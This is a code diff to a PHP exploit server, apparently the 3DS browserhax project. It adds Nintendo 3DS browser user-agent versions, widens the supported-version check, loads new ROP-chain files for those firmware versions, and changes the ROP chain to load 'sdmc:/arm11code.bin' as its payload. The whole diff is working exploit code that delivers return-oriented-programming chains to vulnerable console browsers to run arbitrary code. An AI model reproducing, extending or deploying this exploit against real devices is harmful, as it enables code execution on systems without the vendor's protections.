@@ -99,6 +99,10 @@ if(!isset($browserver))
 	{
 		$browserver = 0xA;
 	}
+	else if(strstr($ua, "1.7639"))//1.7639 v12288/11.14.0-46.
+	{
+		$browserver = 0xB;
+	}
 
 	//new3ds: Mobile-NintendoBrowser-version titlever sysver
 	if(strstr($ua, "1.0.9934"))//1.0.9934 v10 9.0.0-20
@@ -137,6 +141,10 @@ if(!isset($browserver))
 	{
 		$browserver = 0x88;
 	}
+	else if(strstr($ua, "1.11.10172"))//1.11.10172 v11264 11.14.0-46
+	{
+		$browserver = 0x89;
+	}
 }
 
 if($browserver == -1)
@@ -149,7 +157,7 @@ if($browserver == -1)
 $browserver |= $browserver_regionbitmask;
 
 $browserver_actualver = $browserver & 0xF;
-if(!($browserver_actualver>=0x0 && $browserver_actualver<=0xA && (($browserver & 0x80) == 0)) && !(($browserver & 0x80) && ($browserver_actualver>=0x0 && $browserver_actualver<=0x88)))
+if(!($browserver_actualver>=0x0 && $browserver_actualver<=0xB && (($browserver & 0x80) == 0)) && !(($browserver & 0x80) && ($browserver_actualver>=0x0 && $browserver_actualver<=0x89)))
 {
 	echo "This browser version is not supported.\n";
 	//error_log("3dsbrowserhax_common.php: BROWSERVER NOT SUPPORTED.");
@@ -499,6 +507,10 @@ else if($browserver == 0x9)
 else if($browserver == 0xA)
 {
 	require_once("3dsbrowserhax_rop_spider_usaeurjpn_v11297.php");
+}
+else if($browserver == 0xB)
+{
+	require_once("3dsbrowserhax_rop_spider_usaeurjpn_v12288.php");
 }
 else if($browserver == 0x42)//1.7538.CN v0/4.2.0-9
 {
@@ -952,6 +964,10 @@ else if($browserver == 0x88)
 {
 	require_once("3dsbrowserhax_rop_skater_usaeurjpn_v10272.php");
 }
+else if($browserver == 0x89)
+{
+	require_once("3dsbrowserhax_rop_skater_usaeurjpn_v11264.php");
+}
 else if($browserver == 0xD3)//1.3.10126.KR v3077
 {
     require_once("3dsbrowserhax_rop_skater_kor_v3077.php");
@@ -971,6 +987,10 @@ else if($browserver == 0xD6)
 else if($browserver == 0xD7)
 {
     require_once("3dsbrowserhax_rop_skater_kor_v10272.php");
+}
+else if($browserver == 0xD8)
+{
+    require_once("3dsbrowserhax_rop_skater_kor_v11264.php");
 }
 else
 {
@@ -1928,7 +1948,7 @@ function generateropchain_type2()
 
 	$IFile_ctx = $ROPHEAP;
 
-	ropgen_writeu32($ROPHEAP, 0x0100FFFF, 0, 1);
+	ropgen_writeu32($ROPHEAP, 0x019314ff, 0, 1);
 	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that yellow is displayed.
 
 	ropgen_callfunc($LINEAR_TMPBUF, 0x10000, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);
@@ -1997,7 +2017,7 @@ function generateropchain_type2()
 		$databuf[8] = 0x690062;
 		$databuf[9] = 0x6e;*/
 
-		$databuf = string_gendata_array("sdmc:/arm11slot.bin", 1, 0x40);
+		$databuf = string_gendata_array("sdmc:/arm11code.bin", 1, 0x40);
 
 		ropgen_writeregdata_wrap($ROPHEAP+0x40, $databuf, 0, 0x28);//Write the following utf16 string to ROPHEAP+0x40: "sdmc:/arm11code.bin".
 
